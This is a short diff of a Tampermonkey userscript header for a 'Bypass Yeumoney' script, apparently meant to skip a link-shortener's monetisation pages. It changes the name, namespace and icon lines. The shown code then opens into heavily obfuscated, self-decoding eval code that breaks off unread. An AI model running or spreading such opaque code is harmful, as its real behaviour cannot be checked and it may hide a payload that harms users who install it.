@@ -1,5 +1,5 @@
-// @name Bypass Yeumoney V3
-// @namespace http://tampermonkey.net/
+// @name Bypass Yeumoney 
+// @namespace https://www.facebook.com/lapho111
 // @version 3.0
 // @description Bypass Yeumoney
 // @author xGreen
@@ -9,8 +9,6 @@
 // @grant GM_getValue
 // @grant GM_addStyle
 // @run-at document-end
-// ==UserScript==
-// @icon https://avatars.githubusercontent.com/u/85283786?s=48&v=4
 // ==/UserScript==
 let fnT9;!function(){const CnEy=Array.prototype.slice.call(arguments);return
 eval("(function QGXz(zW4r){const TjXr=L3bq(zW4r,rOrs(QGXz.toString()));try{let
